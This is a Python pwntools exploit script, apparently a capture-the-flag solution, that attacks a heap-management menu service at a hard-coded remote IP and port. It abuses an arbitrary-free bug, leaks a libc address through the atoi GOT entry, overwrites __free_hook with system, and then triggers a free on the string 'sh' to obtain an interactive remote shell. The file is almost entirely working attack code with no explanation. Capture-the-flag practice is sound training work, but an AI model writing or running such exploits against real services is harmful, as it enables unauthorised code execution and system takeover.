#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#host = "54.202.2.54"
host = "54.202.7.144"
port = 8888

r = remote(host,port)

def login(name,password):
    r.recvuntil(":")
    r.send(name)
    r.recvuntil("(y/n)")
    r.sendline("y")
    r.recvuntil(":")
    r.send(password)

def leave(index,size,msg):
    r.recvuntil(">> ")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(index))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(msg)


def edit(msg):
    r.recvuntil(">> ")
    r.sendline("2")
    r.recvuntil(":")
    r.send(msg)

def view(idx):
    r.recvuntil(">> ")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def dele(idx):
    r.recvuntil(">> ")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def change_pass(old,newusr,newpass):
    r.recvuntil(">> ")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(old)
    r.recvuntil(":")
    r.sendline(newusr)
    r.recvuntil(":")
    r.sendline(newpass)

atoi_got = 0x000000000601ff0
login(p64(0)*3+p64(0x21),p64(0x602a40) + p64(0)*2 + p64(0x21))
leave(1,0x10,"dada")
dele(-6) # It can free anywhere.
change_pass("\x00","sh\x00",p64(0x602a50))
leave(2,0x10,"sh\x00")
leave(0,0x18,"ddaa")
edit(p32(0x18) + p32(0x18) + p32(0x18) + p32(0) + p64(0x602a70))
edit(p64(0x602a70) + p64(atoi_got))
view(1)
r.recvuntil("View Message: ")
data = r.recvuntil("\n")[:-1].ljust(8,"\x00")
#libc = u64(data) - 0x36e80
libc = u64(data) - 0x0000000000036e70
#system = libc + 0x45390  
system = libc + 0x045380
#free_hook = libc + 0x3c57a8
free_hook = libc + 0x00000000003c57a8
print hex(libc)
edit(p64(free_hook))
edit(p64(system))
dele(2)
r.interactive()


